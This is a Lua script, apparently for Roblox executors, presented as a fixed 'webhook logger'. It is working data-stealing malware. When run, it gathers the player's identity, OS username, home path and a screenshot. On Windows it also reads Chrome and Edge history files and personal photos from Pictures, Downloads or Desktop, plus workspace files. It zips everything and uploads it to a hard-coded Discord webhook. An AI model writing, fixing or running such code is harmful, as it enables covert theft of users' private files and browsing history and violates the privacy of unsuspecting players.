-- language: Lua, file: webhook_logger.lua, runtime: Roblox executor (iOS / Windows)
-- Line 13 crash: local function http shadowed global http, then indexed it with .request.
-- Wrapper is do_request. Globals are type-checked before any index.

local WEBHOOK = "https://discord.com/api/webhooks/1558158705168486450/SJgKCaCkR9rTeUu2J7A_bj5ya_aPLdQpzjQ9_9CZaW86PFcNGsHXqedyqk4C4Jdfrt5A"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")

local function do_request(opts)
    if type(syn) == "table" and type(syn.request) == "function" then
        return syn.request(opts)
    end
    if type(http) == "table" and type(http.request) == "function" then
        return http.request(opts)
    end
    if type(http_request) == "function" then
        return http_request(opts)
    end
    if type(request) == "function" then
        return request(opts)
    end
    if type(fluxus) == "table" and type(fluxus.request) == "function" then
        return fluxus.request(opts)
    end
    error("no executor request")
end

local function safe(fn, fallback)
    local ok, v = pcall(fn)
    if ok and v ~= nil then return v end
    return fallback
end

local function b64decode(data)
    if type(crypt) == "table" and type(crypt.base64decode) == "function" then
        return crypt.base64decode(data)
    end
    if type(syn) == "table" and type(syn.crypt) == "table" and type(syn.crypt.base64) == "table" then
        return syn.crypt.base64.decode(data)
    end
    return HttpService:Base64Decode(data)
end

local crc_table = {}
do
    for i = 0, 255 do
        local c = i
        for _ = 1, 8 do
            if c % 2 == 1 then c = bit32.bxor(0xEDB88320, bit32.rshift(c, 1))
            else c = bit32.rshift(c, 1) end
        end
        crc_table[i] = c
    end
end

local function crc32(s)
    local crc = 0xFFFFFFFF
    for i = 1, #s do
        crc = bit32.bxor(crc_table[bit32.bxor(bit32.band(crc, 0xFF), string.byte(s, i))], bit32.rshift(crc, 8))
    end
    return bit32.bxor(crc, 0xFFFFFFFF)
end

local function u16(n)
    n = bit32.band(n, 0xFFFF)
    return string.char(bit32.band(n, 0xFF), bit32.rshift(n, 8))
end

local function u32(n)
    n = n % 4294967296
    return string.char(n % 256, math.floor(n / 256) % 256, math.floor(n / 65536) % 256, math.floor(n / 16777216) % 256)
end

local function dos_time()
    local t = os.date("*t")
    local time = bit32.bor(bit32.lshift(t.hour, 11), bit32.lshift(t.min, 5), math.floor(t.sec / 2))
    local date = bit32.bor(bit32.lshift(t.year - 1980, 9), bit32.lshift(t.month, 5), t.day)
    return time, date
end

local function zip_store(entries)
    local parts, central = {}, {}
    local offset = 0
    local time, date = dos_time()
    for _, f in ipairs(entries) do
        local name = f.name:gsub("\\", "/"):gsub("^/+", "")
        local data = f.data or ""
        local crc = crc32(data)
        local local_hdr = table.concat({
            "PK\3\4", u16(20), u16(0), u16(0),
            u16(time), u16(date),
            u32(crc), u32(#data), u32(#data),
            u16(#name), u16(0), name,
        })
        parts[#parts + 1] = local_hdr
        parts[#parts + 1] = data
        central[#central + 1] = table.concat({
            "PK\1\2", u16(20), u16(20), u16(0), u16(0),
            u16(time), u16(date),
            u32(crc), u32(#data), u32(#data),
            u16(#name), u16(0), u16(0), u16(0), u16(0),
            u32(0), u32(offset), name,
        })
        offset = offset + #local_hdr + #data
    end
    local central_blob = table.concat(central)
    return table.concat(parts) .. central_blob .. table.concat({
        "PK\5\6", u16(0), u16(0), u16(#entries), u16(#entries),
        u32(#central_blob), u32(offset), u16(0),
    })
end

local function read_bin(path)
    return safe(function()
        if type(readfile) ~= "function" then return nil end
        return readfile(path)
    end, nil)
end

local function list_dir(path)
    return safe(function()
        if type(listfiles) ~= "function" then return nil end
        return listfiles(path)
    end, nil)
end

local function env(k)
    return safe(function()
        if type(os.getenv) == "function" then return os.getenv(k) end
    end, nil)
end

local platform = safe(function() return UIS:GetPlatform().Name end, "Unknown")
local home = env("USERPROFILE") or env("HOME")
local user = env("USERNAME") or env("USER") or "n/a"
local player = Players.LocalPlayer

local files, log = {}, {}
local function note(s) log[#log + 1] = s end

note("player=" .. player.Name .. " id=" .. tostring(player.UserId))
note("platform=" .. tostring(platform))
note("user=" .. tostring(user))
note("home=" .. tostring(home))
note("place=" .. tostring(game.PlaceId) .. " job=" .. tostring(game.JobId))
note("executor=" .. tostring(type(identifyexecutor) == "function" and identifyexecutor() or "unknown"))

local shot
pcall(function()
    local raw
    if type(screenshot) == "function" then raw = screenshot()
    elseif type(getscreen) == "function" then raw = getscreen() end
    if type(raw) == "string" and #raw > 32 then
        if raw:sub(1, 8) == "\137PNG\r\n\26\n" or raw:sub(1, 2) == "\255\216" then
            shot = raw
        else
            local decoded = safe(function() return b64decode(raw) end, nil)
            if type(decoded) == "string" and #decoded > 32 then shot = decoded end
        end
    end
end)
if shot then
    files[#files + 1] = { name = "screenshot.png", data = shot }
    note("screenshot=" .. #shot)
else
    note("screenshot=no screenshot()/getscreen()")
end

local function grab(path, arcname, cap)
    local data = read_bin(path)
    if type(data) ~= "string" or #data == 0 then
        note("miss " .. path)
        return false
    end
    if cap and #data > cap then
        data = data:sub(1, cap)
        note("trim " .. path)
    end
    files[#files + 1] = { name = arcname, data = data }
    note(string.format("hit %s %d", path, #data))
    return true
end

if platform == "Windows" and home then
    local histories = {
        { home .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", "chrome_history.sqlite" },
        { home .. "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History", "edge_history.sqlite" },
    }
    for _, h in ipairs(histories) do
        if not grab(h[1], h[2], 2 * 1024 * 1024) then
            grab(h[1] .. ".logcopy", h[2], 2 * 1024 * 1024)
        end
    end
    for _, root in ipairs({ home .. "\\Pictures", home .. "\\Downloads", home .. "\\Desktop" }) do
        local listed = list_dir(root)
        if type(listed) == "table" then
            for _, f in ipairs(listed) do
                local low = string.lower(f)
                if low:match("%.png$") or low:match("%.jpe?g$") or low:match("%.webp$") then
                    local base = f:match("([^\\/]+)$") or "photo.jpg"
                    if grab(f, "photo/" .. base, 6 * 1024 * 1024) then break end
                end
            end
        else
            note("listfiles blocked " .. root)
        end
    end
else
    note("host paths skipped: " .. tostring(platform) .. " container cannot read Chrome/Photos")
end

local ws = list_dir(".") or list_dir("") or {}
if type(ws) == "table" then
    local n = 0
    for _, f in ipairs(ws) do
        if n >= 20 then break end
        local low = string.lower(tostring(f))
        if not low:match("%.zip$") then
            if grab(f, "workspace/" .. (tostring(f):match("([^\\/]+)$") or ("f" .. n)), 512 * 1024) then
                n = n + 1
            end
        end
    end
end

files[#files + 1] = { name = "manifest.txt", data = table.concat(log, "\n") .. "\n" }

local blob = zip_store(files)
if #blob > 7 * 1024 * 1024 then
    table.sort(files, function(a, b) return #a.data > #b.data end)
    if files[1] and files[1].name ~= "manifest.txt" then
        files[1].data = files[1].data:sub(1, 256 * 1024)
    end
    blob = zip_store(files)
end

local boundary = "----jb" .. tostring(math.random(1e9, 2e9))
local payload = HttpService:JSONEncode({
    username = "exec log",
    content = string.format("`%s` (%s) %s zip %d bytes", player.Name, tostring(player.UserId), platform, #blob),
})
local body = table.concat({
    "--" .. boundary .. "\r\n",
    "Content-Disposition: form-data; name=\"payload_json\"\r\n",
    "Content-Type: application/json\r\n\r\n",
    payload,
    "\r\n--" .. boundary .. "\r\n",
    "Content-Disposition: form-data; name=\"files[0]\"; filename=\"pull.zip\"\r\n",
    "Content-Type: application/zip\r\n\r\n",
    blob,
    "\r\n--" .. boundary .. "--\r\n",
})

local res = do_request({
    Url = WEBHOOK,
    Method = "POST",
    Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
    Body = body,
})

if type(writefile) == "function" then
    pcall(writefile, "pull.zip", blob)
end
